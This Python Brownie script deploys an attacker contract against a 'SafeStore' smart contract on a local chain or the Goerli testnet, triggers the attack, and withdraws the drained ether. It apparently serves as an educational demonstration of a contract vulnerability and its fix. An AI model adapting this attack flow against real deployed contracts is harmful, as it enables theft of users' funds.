from brownie import SafeStoreAttack, SafeStore, network, accounts
from scripts.helpful_scripts import (
    get_account,
    deposit_value,
    withdraw_value,
    TESTNET_ENVIRONMENTS,
)
from web3 import Web3


def deploy_attacker():
    # Get appropriate account
    if network.show_active() in TESTNET_ENVIRONMENTS:
        print("Checking if attacker contract exists...")
        account = get_account(id="test_acct_4")
        # Check if SafeStore exists
        if len(SafeStoreAttack) <= 0:
            try:
                # Fetch SafeStore contract address to pass into SafeStoreAttack constructor
                safe_store_address = SafeStore[-1].address
                print("Deploying attacker contract to goerli...")
                SafeStoreAttack.deploy(safe_store_address, {"from": account})
            except:
                ValueError
                print("SafeStore contract not yet deployed")
        else:
            print("SafeStoreAttack already deployed")
    # Deploy from development network
    else:
        account = accounts[0]
        print("Deploying SafeStore...")
        safeStore = SafeStore.deploy({"from": account})
        safeStore_address = safeStore.address
        print("Deploying attacker contract...")
        SafeStoreAttack.deploy(safeStore_address, {"from": account})


def attack():
    """
    Calls attack function against SafeStore and gives updates on contract balances
    """
    # Get appropriate accounts
    if network.show_active() in TESTNET_ENVIRONMENTS:
        print("\nEnter account passwords to attack...")
        account = get_account(id="test_acct_4")
        account2 = get_account(id="metamask-goerli")
    else:
        account = accounts[0]
        # Used as a victim (innocent client) of the contract
        account2 = accounts[1]
    try:
        # Verify contracts have been deployed
        attacker_contract = SafeStoreAttack[-1]
        safe_store = SafeStore[-1]
    except:
        IndexError
        print("No contract deployed please run deploy function")

    # Fetch contract balances and convert them from wei to ether
    attacker_contract_balance = Web3.fromWei(
        attacker_contract.getAttackerBalance(), "ether"
    )
    print(f"SafeStoreAttacker balance = {attacker_contract_balance} ether")
    safe_store_contract_balance = Web3.fromWei(safe_store.getBalance(), "ether")
    print(f"SafeStore balance = {safe_store_contract_balance} ether")

    # If no funds on contract use victim account so there is funds to attack
    if safe_store_contract_balance <= 0:
        safe_store.deposit({"value": deposit_value, "from": account2})
    try:
        # Attempt to attack the SafeStore contract
        attacker_contract.attack({"value": deposit_value, "from": account})
        print("Attack confirmed")
        print(f"Updated attacker balance = {attacker_contract_balance} ether")
        print(f"Updated SafeStore balance = {safe_store_contract_balance} ether")
    except:
        # You will get this statement when the attack is rejected by the modified contract
        print("Attack reverted")


def withdraw_from_attacker_contract():
    # Get appropriate account
    if network.show_active() in TESTNET_ENVIRONMENTS:
        print("\nWithdraw from attack contract -> attacker address")
        account = get_account(id="test_acct_4")
    else:
        account = accounts[0]
    try:
        # Check if SafeStoreAttack has been deployed
        attacker_contract = SafeStoreAttack[-1]
    except:
        IndexError
        print("No contract deployed please run deploy function")
    # Verify there are funds to withdraw from SafeStore attack
    # If the attack is successful there will be and the owner will need to withdraw
    # funds from the contract
    if attacker_contract.balance() > 0:
        print(f"Withdrawing funds from {attacker_contract.address}")
        attacker_contract.withdraw({"from": account})
        print("Funds successfully deposited to contract owner")
    else:
        print("No funds to withdraw from attacker contract")
        # Once the attack is reverted there will be funds left in the SafeStore contract
        # to deploy. This statement verifies that
        print("Checking balance of SafeStore...")
        safe_store = SafeStore[-1]
        if safe_store.balance() > 0:
            print(
                "Funds still in SafeStore contract use withdraw script to get funds back"
            )
        else:
            print("No funds to withdraw from SafeStore contract")


def main():
    deploy_attacker()
    attack()
    withdraw_from_attacker_contract()
